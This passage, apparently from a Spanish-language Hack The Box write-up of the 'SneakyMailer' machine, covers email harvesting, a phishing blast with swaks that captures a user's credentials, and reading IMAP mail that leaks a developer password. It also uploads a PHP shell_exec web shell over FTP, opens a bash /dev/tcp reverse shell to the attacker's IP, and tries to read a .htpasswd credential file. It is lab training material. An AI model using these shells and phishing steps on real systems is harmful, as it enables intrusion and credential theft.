      &lt;td&gt;HTTP&lt;/td&gt;
      &lt;td&gt;nginx 1.14.2&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;143&lt;/td&gt;
      &lt;td&gt;IMAP&lt;/td&gt;
      &lt;td&gt;Courier Imapd&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;993&lt;/td&gt;
      &lt;td&gt;IMAP/SSL&lt;/td&gt;
      &lt;td&gt;Courier Imapd&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;8080&lt;/td&gt;
      &lt;td&gt;HTTP&lt;/td&gt;
      &lt;td&gt;nginx 1.14.2&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;Comenzando primeramente intentaremos conectarnos como el usuario &lt;code&gt;anonymous&lt;/code&gt; por el servicio &lt;code&gt;ftp&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ftp 10.10.10.197
Connected to 10.10.10.197.
220 (vsFTPd 3.0.3)
Name (10.10.10.197:fmiracle): anonymous
530 Permission denied.
Login failed.
ftp&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Vemos que no contamos con acceso asi que proseguiremos a usar la herramienta &lt;code&gt;whatweb&lt;/code&gt; para ver el gestor de contenido de los servicios &lt;code&gt;http&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ whatweb http://10.10.10.197
http://10.10.10.197 [301 Moved Permanently] Country[RESERVED][ZZ], HTTPServer[nginx/1.14.2], IP[10.10.10.197], RedirectLocation[http://sneakycorp.htb], Title[301 Moved Permanently], nginx[1.14.2]
http://sneakycorp.htb [200 OK] Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[nginx/1.14.2], IP[10.10.10.197], JQuery, Script, Title[Employee - Dashboard], X-UA-Compatible[IE=edge], nginx[1.14.2]
❯ whatweb http://10.10.10.197:8080
http://10.10.10.197:8080 [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[nginx/1.14.2], IP[10.10.10.197], Title[Welcome to nginx!], nginx[1.14.2]
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;code&gt;whatweb&lt;/code&gt; nos reporta que se esta aplicando virtual hosting, concretamente al dominio &lt;code&gt;http://sneakycorp.htb&lt;/code&gt; asi que comenzemos agregandolo a nuestro &lt;code&gt;/etc/hosts&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;echo &quot;10.10.10.197 sneakycorp.htb&quot; &amp;gt;&amp;gt; /etc/hosts
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;explotación&quot;&gt;Explotación &lt;a href=&quot;#explotación&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Vamos a proceder a abrir la pagina web.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Sneakymailer/sneaky1.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Podemos observar un proyecto que nos habla de pypi, pero que es &lt;code&gt;pypi&lt;/code&gt;&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;El Python Package Index o PyPI es el repositorio de software oficial para aplicaciones de terceros en el lenguaje de programación Python.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Sneakymailer/sneaky2.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Observamos un potencial de correos filtrados de la compañia&lt;/p&gt;

&lt;p&gt;Parceamos los correos filtrados usando la siguente expresión y los exportamos a un fichero de nombre &lt;code&gt;mails.txt&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;curl -s -X GET &quot;http://sneakycorp.htb/team.php&quot; | grep &quot;sneakymailer&quot; | html2text | xargs | tr ' ' ',' &amp;gt; mails.txt
❯ /bin/cat mails.txt
tigernixon@sneakymailer.htb,garrettwinters@sneakymailer.htb,ashtoncox@sneakymailer.htb,cedrickelly@sneakymailer.htb,airisatou@sneakymailer.htb,briellewilliamson@sneakymailer.htb,herrodchandler@sneakymailer.htb,rhonadavidson@sneakymailer.htb,colleenhurst@sneakymailer.htb,sonyafrost@sneakymailer.htb,jenagaines@sneakymailer.htb,quinnflynn@sneakymailer.htb,chardemarshall@sneakymailer.htb,haleykennedy@sneakymailer.htb,tatyanafitzpatrick@sneakymailer.htb,michaelsilva@sneakymailer.htb,paulbyrd@sneakymailer.htb,glorialittle@sneakymailer.htb,bradleygreer@sneakymailer.htb,dairios@sneakymailer.htb,jenettecaldwell@sneakymailer.htb,yuriberry@sneakymailer.htb,caesarvance@sneakymailer.htb,doriswilder@sneakymailer.htb,angelicaramos@sneakymailer.htb,gavinjoyce@sneakymailer.htb,jenniferchang@sneakymailer.htb,brendenwagner@sneakymailer.htb,fionagreen@sneakymailer.htb,shouitou@sneakymailer.htb,michellehouse@sneakymailer.htb,sukiburks@sneakymailer.htb,prescottbartlett@sneakymailer.htb,gavincortez@sneakymailer.htb,martenamccray@sneakymailer.htb,unitybutler@sneakymailer.htb,howardhatfield@sneakymailer.htb,hopefuentes@sneakymailer.htb,vivianharrell@sneakymailer.htb,timothymooney@sneakymailer.htb,jacksonbradshaw@sneakymailer.htb,olivialiang@sneakymailer.htb,brunonash@sneakymailer.htb,sakurayamamoto@sneakymailer.htb,thorwalton@sneakymailer.htb,finncamacho@sneakymailer.htb,sergebaldwin@sneakymailer.htb,zenaidafrank@sneakymailer.htb,zoritaserrano@sneakymailer.htb,jenniferacosta@sneakymailer.htb,carastevens@sneakymailer.htb,hermionebutler@sneakymailer.htb,laelgreer@sneakymailer.htb,jonasalexander@sneakymailer.htb,shaddecker@sneakymailer.htb,sulcud@sneakymailer.htb,donnasnider@sneakymailer.htb
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Como antes nos reporto &lt;code&gt;nmap&lt;/code&gt; el servicio &lt;code&gt;imap&lt;/code&gt; se encuentra activo y como ahora disponemos de una lista de correos, podemos tratar de enviar un correo como cualquier usuario y ver si se nos permite de estar mal configurado.&lt;/p&gt;

&lt;p&gt;Para eso usaremos la herramienta &lt;code&gt;swaks&lt;/code&gt;&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;para instalar la herramienta solo basta con hacer un apt install swaks&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Especificaremos con los comandos &lt;code&gt;from&lt;/code&gt; el correo origen, &lt;code&gt;--to&lt;/code&gt; la lista de correos que obtuvimos, en el &lt;code&gt;body&lt;/code&gt; podemos tratar de enviar un enlace a un servidor &lt;code&gt;http&lt;/code&gt; que nos compartiremos de manera local, de modo que si alguno de los usuarios destinatarios esta abriendo el correo y pinche en el enlace, causara que nos envie una solicitud.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ swaks --from fmiracle@sneakymailer.htb --to tigernixon@sneakymailer.htb,garrettwinters@sneakymailer.htb,ashtoncox@sneakymailer.htb,cedrickelly@sneakymailer.htb,airisatou@sneakymailer.htb,briellewilliamson@sneakymailer.htb,herrodchandler@sneakymailer.htb,rhonadavidson@sneakymailer.htb,colleenhurst@sneakymailer.htb,sonyafrost@sneakymailer.htb,jenagaines@sneakymailer.htb,quinnflynn@sneakymailer.htb,chardemarshall@sneakymailer.htb,haleykennedy@sneakymailer.htb,tatyanafitzpatrick@sneakymailer.htb,michaelsilva@sneakymailer.htb,paulbyrd@sneakymailer.htb,glorialittle@sneakymailer.htb,bradleygreer@sneakymailer.htb,dairios@sneakymailer.htb,jenettecaldwell@sneakymailer.htb,yuriberry@sneakymailer.htb,caesarvance@sneakymailer.htb,doriswilder@sneakymailer.htb,angelicaramos@sneakymailer.htb,gavinjoyce@sneakymailer.htb,jenniferchang@sneakymailer.htb,brendenwagner@sneakymailer.htb,fionagreen@sneakymailer.htb,shouitou@sneakymailer.htb,michellehouse@sneakymailer.htb,sukiburks@sneakymailer.htb,prescottbartlett@sneakymailer.htb,gavincortez@sneakymailer.htb,martenamccray@sneakymailer.htb,unitybutler@sneakymailer.htb,howardhatfield@sneakymailer.htb,hopefuentes@sneakymailer.htb,vivianharrell@sneakymailer.htb,timothymooney@sneakymailer.htb,jacksonbradshaw@sneakymailer.htb,olivialiang@sneakymailer.htb,brunonash@sneakymailer.htb,sakurayamamoto@sneakymailer.htb,thorwalton@sneakymailer.htb,finncamacho@sneakymailer.htb,sergebaldwin@sneakymailer.htb,zenaidafrank@sneakymailer.htb,zoritaserrano@sneakymailer.htb,jenniferacosta@sneakymailer.htb,carastevens@sneakymailer.htb,hermionebutler@sneakymailer.htb,laelgreer@sneakymailer.htb,jonasalexander@sneakymailer.htb,shaddecker@sneakymailer.htb,sulcud@sneakymailer.htb,donnasnider@sneakymailer.htb --body &quot;Entra aqui -&amp;gt; http://10.10.16.2/test&quot; --server 10.10.10.197
=== Trying 10.10.10.197:25...
=== Connected to 10.10.10.197.
&amp;lt;-  220 debian ESMTP Postfix (Debian/GNU)
 -&amp;gt; EHLO hack4u
&amp;lt;-  250-debian
&amp;lt;-  250-PIPELINING
&amp;lt;-  250-SIZE 10240000
&amp;lt;-  250-VRFY
&amp;lt;-  250-ETRN
&amp;lt;-  250-STARTTLS
&amp;lt;-  250-ENHANCEDSTATUSCODES
&amp;lt;-  250-8BITMIME
&amp;lt;-  250-DSN
&amp;lt;-  250-SMTPUTF8
&amp;lt;-  250 CHUNKING
 -&amp;gt; MAIL FROM:&amp;lt;fmiracle@sneakymailer.htb&amp;gt;
&amp;lt;-  250 2.1.0 Ok
 -&amp;gt; RCPT TO:&amp;lt;tigernixon@sneakymailer.htb&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Nos ponemos en escucha con &lt;code&gt;ncat&lt;/code&gt; en el puerto &lt;code&gt;80&lt;/code&gt; y recibimos una petición post.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ncat -nlvp 80
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::80
Ncat: Listening on 0.0.0.0:80
Ncat: Connection from 10.10.10.197.
Ncat: Connection from 10.10.10.197:39458.
POST /test HTTP/1.1
Host: 10.10.16.2
User-Agent: python-requests/2.23.0
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
Content-Length: 185
Content-Type: application/x-www-form-urlencoded

firstName=Paul&amp;amp;lastName=Byrd&amp;amp;email=paulbyrd%40sneakymailer.htb&amp;amp;password=%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt&amp;amp;rpassword=%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Tramos la data y lo exportamos a un ficherito llamando &lt;code&gt;credentials.txt&lt;/code&gt;, donde podemos ver las credenciales de el usuario &lt;code&gt;Paul&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ php --interactive
Interactive mode enabled

php &amp;gt; echo urldecode(&quot;firstName=Paul&amp;amp;lastName=Byrd&amp;amp;email=paulbyrd%40sneakymailer.htb&amp;amp;password=%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt&amp;amp;rpassword=%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt&quot;);
firstName=Paul&amp;amp;lastName=Byrd&amp;amp;email=paulbyrd@sneakymailer.htb&amp;amp;password=^(#J@SkFv2[%KhIxKk(Ju`hqcHl&amp;lt;:Ht&amp;amp;rpassword=^(#J@SkFv2[%KhIxKk(Ju`hqcHl&amp;lt;:Ht

❯ /bin/cat credentials.txt
firstName=Paul
lastName=Byrd
email=paulbyrd@sneakymailer.htb
password=^(#J@SkFv2[%KhIxKk(Ju`hqcHl&amp;lt;:Ht
rpassword=^(#J@SkFv2[%KhIxKk(Ju`hqcHl&amp;lt;:Ht
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ahora provaremos conectarnos con &lt;code&gt;telnet&lt;/code&gt; al puerto &lt;code&gt;143&lt;/code&gt; con esas credenciales.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Puedes guiarte de este articulo donde se explica a detalle como realizar la conexión con telnet y hacer uso de los parametros.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://blog.andrewc.com/2013/01/connect-to-imap-server-with-telnet/&quot;&gt;https://blog.andrewc.com/2013/01/connect-to-imap-server-with-telnet/&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ telnet 10.10.10.197 143
Trying 10.10.10.197...
Connected to 10.10.10.197.
Escape character is '^]'.
* OK [CAPABILITY IMAP4rev1 UIDPLUS CHILDREN NAMESPACE THREAD=ORDEREDSUBJECT THREAD=REFERENCES SORT QUOTA IDLE ACL ACL2=UNION STARTTLS ENABLE UTF8=ACCEPT] Courier-IMAP ready. Copyright 1998-2018 Double Precision, Inc.  See COPYING for distribution information.
a1 LOGIN paulbyrd ^(#J@SkFv2[%KhIxKk(Ju`hqcHl&amp;lt;:Ht
* OK [ALERT] Filesystem notification initialization error -- contact your mail administrator (check for configuration errors with the FAM/Gamin library)
a1 OK LOGIN Ok.
a2 LIST &quot;&quot; &quot;*&quot;
* LIST (\Unmarked \HasChildren) &quot;.&quot; &quot;INBOX&quot;
* LIST (\HasNoChildren) &quot;.&quot; &quot;INBOX.Trash&quot;
* LIST (\HasNoChildren) &quot;.&quot; &quot;INBOX.Sent&quot;
* LIST (\HasNoChildren) &quot;.&quot; &quot;INBOX.Deleted Items&quot;
* LIST (\HasNoChildren) &quot;.&quot; &quot;INBOX.Sent Items&quot;
a2 OK LIST completed
a3 EXAMINE &quot;INBOX.Trash&quot;
* FLAGS (\Draft \Answered \Flagged \Deleted \Seen \Recent)
* OK [PERMANENTFLAGS ()] No permanent flags permitted
* 0 EXISTS
* 0 RECENT
* OK [UIDVALIDITY 590600304] Ok
* OK [MYRIGHTS &quot;acdilrsw&quot;] ACL
a3 OK [READ-ONLY] Ok
a4 EXAMINE &quot;INBOX.Sent&quot;
* FLAGS (\Draft \Answered \Flagged \Deleted \Seen \Recent)
* OK [PERMANENTFLAGS ()] No permanent flags permitted
* 0 EXISTS
* 0 RECENT
* OK [UIDVALIDITY 590600538] Ok
* OK [MYRIGHTS &quot;acdilrsw&quot;] ACL
a4 OK [READ-ONLY] Ok
a5 EXAMINE &quot;INBOX.Deleted Items&quot;
* FLAGS (\Draft \Answered \Flagged \Deleted \Seen \Recent)
* OK [PERMANENTFLAGS ()] No permanent flags permitted
* 0 EXISTS
* 0 RECENT
* OK [UIDVALIDITY 589481592] Ok
* OK [MYRIGHTS &quot;acdilrsw&quot;] ACL
a5 OK [READ-ONLY] Ok
a6 EXAMINE &quot;INBOX.Sent Items&quot;
* FLAGS (\Draft \Answered \Flagged \Deleted \Seen \Recent)
* OK [PERMANENTFLAGS ()] No permanent flags permitted
* 2 EXISTS
* 0 RECENT
* OK [UIDVALIDITY 589480766] Ok
* OK [MYRIGHTS &quot;acdilrsw&quot;] ACL
a6 OK [READ-ONLY] Ok
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Examinado la ultima bandeja encontramos 2 correos existentes y visualizando el primer correo optenemos unas credenciales del usuario &lt;code&gt;developer&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;a7 FETCH 1 BODY[]
* 1 FETCH (BODY[] {2167}
MIME-Version: 1.0
To: root &amp;lt;root@debian&amp;gt;
From: Paul Byrd &amp;lt;paulbyrd@sneakymailer.htb&amp;gt;
Subject: Password reset
Date: Fri, 15 May 2020 13:03:37 -0500
Importance: normal
X-Priority: 3
Content-Type: multipart/alternative;
	boundary=&quot;_21F4C0AC-AA5F-47F8-9F7F-7CB64B1169AD_&quot;

--_21F4C0AC-AA5F-47F8-9F7F-7CB64B1169AD_
Content-Transfer-Encoding: quoted-printable
Content-Type: text/plain; charset=&quot;utf-8&quot;

Hello administrator, I want to change this password for the developer accou=
nt

Username: developer
Original-Password: m^AsY7vTKVT+dV1{WOU%@NaHkUAId3]C

Please notify me when you do it=20

--_21F4C0AC-AA5F-47F8-9F7F-7CB64B1169AD_
Content-Transfer-Encoding: quoted-printable
Content-Type: text/html; charset=&quot;utf-8&quot;

&amp;lt;html xmlns:o=3D&quot;urn:schemas-microsoft-com:office:office&quot; xmlns:w=3D&quot;urn:sc=
hemas-microsoft-com:office:word&quot; xmlns:m=3D&quot;http://schemas.microsoft.com/of=
fice/2004/12/omml&quot; xmlns=3D&quot;http://www.w3.org/TR/REC-html40&quot;&amp;gt;&amp;lt;head&amp;gt;&amp;lt;meta ht=
tp-equiv=3DContent-Type content=3D&quot;text/html; charset=3Dutf-8&quot;&amp;gt;&amp;lt;meta name=
=3DGenerator content=3D&quot;Microsoft Word 15 (filtered medium)&quot;&amp;gt;&amp;lt;style&amp;gt;&amp;lt;!--
/* Font Definitions */
@font-face
	{font-family:&quot;Cambria Math&quot;;
	panose-1:2 4 5 3 5 4 6 3 2 4;}
@font-face
	{font-family:Calibri;
	panose-1:2 15 5 2 2 2 4 3 2 4;}
/* Style Definitions */
p.MsoNormal, li.MsoNormal, div.MsoNormal
	{margin:0in;
	margin-bottom:.0001pt;
	font-size:11.0pt;
	font-family:&quot;Calibri&quot;,sans-serif;}
.MsoChpDefault
	{mso-style-type:export-only;}
@page WordSection1
	{size:8.5in 11.0in;
	margin:1.0in 1.0in 1.0in 1.0in;}
div.WordSection1
	{page:WordSection1;}
--&amp;gt;&amp;lt;/style&amp;gt;&amp;lt;/head&amp;gt;&amp;lt;body lang=3DEN-US link=3Dblue vlink=3D&quot;#954F72&quot;&amp;gt;&amp;lt;div cla=
ss=3DWordSection1&amp;gt;&amp;lt;p class=3DMsoNormal&amp;gt;Hello administrator, I want to chang=
e this password for the developer account&amp;lt;/p&amp;gt;&amp;lt;p class=3DMsoNormal&amp;gt;&amp;lt;o:p&amp;gt;&amp;amp;nbs=
p;&amp;lt;/o:p&amp;gt;&amp;lt;/p&amp;gt;&amp;lt;p class=3DMsoNormal&amp;gt;Username: developer&amp;lt;/p&amp;gt;&amp;lt;p class=3DMsoNorma=
l&amp;gt;Original-Password: m^AsY7vTKVT+dV1{WOU%@NaHkUAId3]C&amp;lt;/p&amp;gt;&amp;lt;p class=3DMsoNorm=
al&amp;gt;&amp;lt;o:p&amp;gt;&amp;amp;nbsp;&amp;lt;/o:p&amp;gt;&amp;lt;/p&amp;gt;&amp;lt;p class=3DMsoNormal&amp;gt;Please notify me when you do i=
t &amp;lt;/p&amp;gt;&amp;lt;/div&amp;gt;&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;=

--_21F4C0AC-AA5F-47F8-9F7F-7CB64B1169AD_--
)
a7 OK FETCH completed.
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Como ahora disponemos de credenciales nuevas:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;code&gt;developer:m^AsY7vTKVT+dV1{WOU%@NaHkUAId3]C&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Volemos a tratar de conectarnos por &lt;code&gt;ftp&lt;/code&gt; y esta vez la conexión es exitosa.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ftp 10.10.10.197
Connected to 10.10.10.197.
220 (vsFTPd 3.0.3)
Name (10.10.10.197:fmiracle): developer
331 Please specify the password.
Password:
230 Login successful.

Remote system type is UNIX.
Using binary mode to transfer files.
ftp&amp;gt; 
ftp&amp;gt; dir
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxrwxr-x    8 0        1001         4096 Jun 30  2020 dev
226 Directory send OK.
ftp&amp;gt; cd dev
250 Directory successfully changed.
ftp&amp;gt; dir
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 0        0            4096 May 26  2020 css
drwxr-xr-x    2 0        0            4096 May 26  2020 img
-rwxr-xr-x    1 0        0           13742 Jun 23  2020 index.php
drwxr-xr-x    3 0        0            4096 May 26  2020 js
drwxr-xr-x    2 0        0            4096 May 26  2020 pypi
drwxr-xr-x    4 0        0            4096 May 26  2020 scss
-rwxr-xr-x    1 0        0           26523 May 26  2020 team.php
drwxr-xr-x    8 0        0            4096 May 26  2020 vendor
226 Directory send OK.
ftp&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Despues de conectarnos visualizamos un directorio &lt;code&gt;dev&lt;/code&gt; y dentro un contenido de nombre &lt;code&gt;team.php&lt;/code&gt;, que curiosamente era la ruta de la pagina donde estaban expuestos los correos.&lt;/p&gt;

&lt;p&gt;Para poder saber si tenemos permiso de escritura intentaremos subir un archivo de nombre &lt;code&gt;cmd.php&lt;/code&gt; que con el uso de la función &lt;code&gt;shell_exec&lt;/code&gt; me ejecute un comando a nivel de sistema que vamos a controlar con el parametro &lt;code&gt;cmd&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php&quot;&gt;&amp;lt;?php
    echo &quot;&amp;lt;pre&amp;gt;&quot; . shell_exec($_REQUEST['cmd']) . &quot;&amp;lt;/pre&amp;gt;&quot;;
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Comprobamos que efectivamente si podemos subir el archivo&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;ftp&amp;gt; put cmd.php
local: cmd.php remote: cmd.php
200 PORT command successful. Consider using PASV.
150 Ok to send data.
d226 Transfer complete.
69 bytes sent in 0.00 secs (811.8411 kB/s)
ftp&amp;gt; dir
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
--wxrw-rw-    1 1001     1001           69 Apr 08 19:15 cmd.php
drwxr-xr-x    2 0        0            4096 May 26  2020 css
drwxr-xr-x    2 0        0            4096 May 26  2020 img
-rwxr-xr-x    1 0        0           13742 Jun 23  2020 index.php
drwxr-xr-x    3 0        0            4096 May 26  2020 js
drwxr-xr-x    2 0        0            4096 May 26  2020 pypi
drwxr-xr-x    4 0        0            4096 May 26  2020 scss
-rwxr-xr-x    1 0        0           26523 May 26  2020 team.php
drwxr-xr-x    8 0        0            4096 May 26  2020 vendor
226 Directory send OK.
ftp&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Visitamos la &lt;code&gt;url&lt;/code&gt;, pero esta vez apuntaremos al fichero que subimos.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Sneakymailer/sneaky3.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;El servicio nos reporta un codigo de estado &lt;code&gt;400&lt;/code&gt; lo que corresponde a que el archivo no existe…&lt;/p&gt;

&lt;p&gt;Pero dado a que existe un directorio &lt;code&gt;dev&lt;/code&gt; podemos pensar que puede ser un posible subdominio, asi que usaremos &lt;code&gt;gobuster&lt;/code&gt; para tratar de enumerar posibles subdominios validos existentes y usaremos el diccionario &lt;code&gt;subdomains-top1million-5000.txt&lt;/code&gt; del repositorio de &lt;code&gt;seclists&lt;/code&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/OJ/gobuster&quot;&gt;https://github.com/OJ/gobuster&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/danielmiessler/SecLists&quot;&gt;https://github.com/danielmiessler/SecLists&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ gobuster vhost -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u http://sneakycorp.htb/ -t 200
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) &amp;amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:          http://sneakycorp.htb/
[+] Method:       GET
[+] Threads:      200
[+] Wordlist:     /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
[+] User Agent:   gobuster/3.1.0
[+] Timeout:      10s
===============================================================
2023/04/08 23:21:48 Starting gobuster in VHOST enumeration mode
===============================================================
Found: dev.sneakycorp.htb (Status: 200) [Size: 13742]
                                                     
===============================================================
2023/04/08 23:21:58 Finished
===============================================================
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Pues &lt;code&gt;gobuster&lt;/code&gt; nos reporta que el subdominio es valido, lo que quiere decir que el archivo que subimos antes existe, pero bajo ese subdominio.&lt;/p&gt;

&lt;p&gt;Procedemos a subir nuevamente el archivo ya que a intervalos de tiempo nos lo borra&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;ftp&amp;gt; put cmd.php
local: cmd.php remote: cmd.php
200 PORT command successful. Consider using PASV.
150 Ok to send data.
226 Transfer complete.
69 bytes sent in 0.00 secs (990.9237 kB/s)
ftp&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Volvemos a visitar la &lt;code&gt;url&lt;/code&gt; esta vez apuntando al subdominio y al archivo subido no sin antes agregar el subdominio a nuestro &lt;code&gt;/etc/hosts&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ echo &quot;10.10.10.197 dev.sneakycorp.htb&quot; &amp;gt;&amp;gt; /etc/hosts
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Esta vez si podemos apuntar al archivo &lt;code&gt;cmd.php&lt;/code&gt; y con el parametro &lt;code&gt;cmd&lt;/code&gt; tal y como lo habiamos especificado, podemos ejecutar comandos.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Sneakymailer/sneaky4.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Lo siguiente sera ganar acceso a la maquina, mandandonos una shell reversa a nuestra maquina local, ello lo haremos con &lt;code&gt;bash&lt;/code&gt; con el comando &lt;code&gt;bash -c 'bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.16.2/443 0&amp;gt;&amp;amp;1'&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;No olvidemos poner los &lt;code&gt;&amp;amp;&lt;/code&gt; en urleconde &lt;code&gt;%26&lt;/code&gt; para evitar problemas, y enviamos la petición&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Sneakymailer/sneaky5.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Nos ponemos en escucha y recimos la conexión como el usuario &lt;code&gt;www-data&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ncat -nlvp 443
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.197.
Ncat: Connection from 10.10.10.197:37818.
bash: cannot set terminal process group (734): Inappropriate ioctl for device
bash: no job control in this shell
www-data@sneakymailer:~/dev.sneakycorp.htb/dev$ whoami
whoami
www-data
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Como siempre al ser una maquina &lt;code&gt;linux&lt;/code&gt; hacemos un tratamiento de la &lt;code&gt;tty&lt;/code&gt; para que sea full interactiva y ajustamos el tamaño de las proporciones de la pantall.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;www-data@sneakymailer:~/dev.sneakycorp.htb/dev$ script /dev/null -c bash
script /dev/null -c bash
Script started, file is /dev/null
www-data@sneakymailer:~/dev.sneakycorp.htb/dev$ ^Z
zsh: suspended  ncat -nlvp 443
❯ stty raw -echo; fg
[1]  + continued  ncat -nlvp 443
                                reset xterm
www-data@sneakymailer:~/dev.sneakycorp.htb/dev$ export TERM=xterm
www-data@sneakymailer:~/dev.sneakycorp.htb/dev$ export SHELL=bash
www-data@sneakymailer:~/dev.sneakycorp.htb/dev$ stty rows 48 columns 184
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Una vez en la maquina listamos los procesos corriendo y vemos uno correspondiente a &lt;code&gt;pypi&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;www-data@sneakymailer:~/dev.sneakycorp.htb/dev$ ps -faux | grep 5000
www-data  7185  0.0  0.0   3084   824 pts/0    S+   19:49   0:00  |                           \_ grep 5000
pypi       741  0.0  0.6  36804 25824 ?        Ss   17:09   0:08 /var/www/pypi.sneakycorp.htb/venv/bin/python3 /var/www/pypi.sneakycorp.htb/venv/bin/pypi-server -i 127.0.0.1 -p 5000 -a update,download,list -P /var/www/pypi.sneakycorp.htb/.htpasswd --disable-fallback -o /var/www/pypi.sneakycorp.htb/packages
www-data@sneakymailer:~/dev.sneakycorp.htb/dev$
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Podemos ver que se establece un tipo de conexión procediente de un archivo asi que procederemos a leeerlo&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;www-data@sneakymailer:~/dev.sneakycorp.htb/dev$ cat /var/www/pypi.sneakycorp.htb/.htpasswd
